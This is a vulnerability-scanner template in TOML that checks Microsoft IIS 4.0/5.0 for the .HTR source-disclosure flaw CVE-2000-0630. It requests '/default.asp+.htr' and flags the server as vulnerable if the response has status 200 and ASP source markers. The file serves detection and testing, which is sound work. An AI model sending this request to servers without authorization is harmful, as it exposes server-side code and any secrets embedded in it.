[info]
author = "ave"
description = "验证 Microsoft IIS 4.0/5.0 .HTR 文件片段读取漏洞，通过在 URL 后追加 +.htr 后缀触发源代码泄露"
id = "POC-AVE-2000-0484"
name = "CVE-2000-0630 PoC"
severity = "medium"
tags = ["ave-2000-0484"]
vuln_id = [
    "CVE-2000-0630",
    "AVE-2000-0484",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/default.asp+.htr"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "<script",
    "Response.Write",
    "Server.CreateObject",
    "<%",
    "<%@",
    "VBScript",
    "JScript",
]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
